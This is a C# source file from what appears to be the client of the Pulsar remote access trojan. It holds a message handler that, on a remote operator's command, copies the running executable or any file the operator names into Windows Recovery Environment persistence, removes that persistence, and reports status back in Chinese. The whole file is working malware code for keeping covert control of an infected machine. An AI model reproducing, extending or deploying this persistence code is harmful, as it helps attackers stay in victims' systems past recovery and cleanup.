using Pulsar.Client.Helper.WinRE;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.ClientManagement.WinRE;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Pulsar.Client.Messages
{
    public class WinREPersistenceHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoAddWinREPersistence || message is DoRemoveWinREPersistence || message is AddCustomFileWinRE;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoAddWinREPersistence msg:
                    Execute(sender, msg);
                    break;

                case DoRemoveWinREPersistence msg:
                    Execute(sender, msg);
                    break;

                case AddCustomFileWinRE msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoAddWinREPersistence message)
        {
            try
            {
                string exeLocation;

                try
                {
                    exeLocation = Assembly.GetExecutingAssembly().Location;

                    if (string.IsNullOrEmpty(exeLocation))
                    {
                        // we running in memory
                        return;
                    }
                }
                catch (Exception ex)
                {
                    // ye we def in memory
                    Debug.WriteLine($"获取程序集路径失败: {ex.Message}");
                    return;
                }

                byte[] bytes = System.IO.File.ReadAllBytes(exeLocation);
                WinREPersistence.Uninstall();
                WinREPersistence.InstallFile(bytes, ".exe");

                client.Send(new SetStatus
                {
                    Message = "已添加 WinRE 持久化"
                });
            }
            catch
            {
                client.Send(new SetStatus
                {
                    Message = "添加 WinRE 持久化失败"
                });
            }
        }

        private void Execute(ISender client, DoRemoveWinREPersistence message)
        {
            try
            {
                WinREPersistence.Uninstall();
                client.Send(new SetStatus
                {
                    Message = "已移除 WinRE 持久化"
                });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus
                {
                    Message = $"移除 WinRE 持久化失败: {ex.Message}"
                });
            }
        }

        private void Execute(ISender client, AddCustomFileWinRE message)
        {
            try
            {
                if (string.IsNullOrEmpty(message.Path))
                {
                    client.Send(new SetStatus
                    {
                        Message = "自定义文件路径无效或参数错误。"
                    });
                    return;
                }

                if (!File.Exists(message.Path))
                {
                    client.Send(new SetStatus
                    {
                        Message = "自定义文件不存在。"
                    });
                    return;
                }

                byte[] fileBytes = File.ReadAllBytes(message.Path);

                WinREPersistence.Uninstall();

                string fileExtension = Path.GetExtension(message.Path);

                WinREPersistence.InstallFile(fileBytes, fileExtension);
                client.Send(new SetStatus
                {
                    Message = "已添加自定义文件到 WinRE 持久化"
                });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus
                {
                    Message = $"添加自定义文件失败: {ex.Message}"
                });
            }
        }
    }
}